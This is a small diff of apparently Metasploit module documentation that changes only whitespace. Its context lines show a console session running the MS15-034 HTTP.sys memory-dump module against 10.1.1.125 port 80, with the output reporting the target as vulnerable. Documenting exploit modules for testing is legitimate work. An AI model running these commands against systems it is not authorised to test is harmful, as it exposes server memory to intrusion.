@@ -16,8 +16,6 @@ msf auxiliary(ms15_034_http_sys_memory_dump) > set RHOSTS 10.1.1.125
 RHOSTS => 10.1.1.125
 msf auxiliary(ms15_034_http_sys_memory_dump) > set RPORT 80
 RPORT => 80
-
-
 msf auxiliary(ms15_034_http_sys_memory_dump) > exploit
 
 [+] Target is vulnerable!
@@ -59,3 +57,5 @@ msf auxiliary(ms15_034_http_sys_memory_dump) > exploit
 [*] Auxiliary module execution completed
 msf auxiliary(ms15_034_http_sys_memory_dump) > 
 ```
+
+
